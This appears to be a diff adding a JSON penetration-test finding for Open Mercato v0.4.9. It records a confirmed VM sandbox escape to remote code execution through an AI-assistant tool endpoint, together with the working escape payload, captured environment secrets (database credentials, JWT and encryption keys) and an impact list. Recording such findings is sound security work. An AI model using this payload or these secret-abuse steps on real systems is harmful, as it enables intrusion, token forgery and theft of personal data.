@@ -1,0 +1,26 @@
+{
+  "finding": "NEW-01: VM Sandbox Escape -> RCE",
+  "target": "http://10.0.64.14:3000",
+  "version": "Open Mercato v0.4.9",
+  "date": "2026-03-28",
+  "endpoint": "POST /api/ai_assistant/tools/execute",
+  "auth_required": "admin role (ai_assistant.view feature)",
+  "exploit_confirmed": true,
+  "node_version": "\"v24.14.1\\n\"",
+  "shell_id": "\"uid=1001(omuser) gid=1001(omuser) groups=1001(omuser)\\n\"",
+  "DATABASE_URL": "\"postgres://postgres:postgres@mercato-postgres-local:5432/open-mercato\"",
+  "JWT_SECRET": "\"demo-jwt-secret-change-for-prod\"",
+  "ENCRYPTION_KEY": "\"dev-tenant-encryption-fallback-key-32chars\"",
+  "MEILISEARCH_KEY": "\"meilisearch-dev-key\"",
+  "REDIS_URL": "\"redis://mercato-redis-local:6379\"",
+  "exploit_code": "Promise.resolve().constructor.constructor(`return process.getBuiltinModule('child_process').execSync('CMD').toString()`)()",
+  "cvss": "9.9 Critical (AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H)",
+  "impact": [
+    "Shell RCE as uid=1001(omuser) inside container",
+    "DATABASE_URL -> direct Postgres access bypassing all app security",
+    "JWT_SECRET -> forge any user JWT, instant superadmin",
+    "ENCRYPTION_KEY -> decrypt all PII fields offline",
+    "MEILISEARCH_KEY -> dump all indexed data cross-tenant",
+    "No machine/SSH access required -- pure HTTP exploit"
+  ]
+}
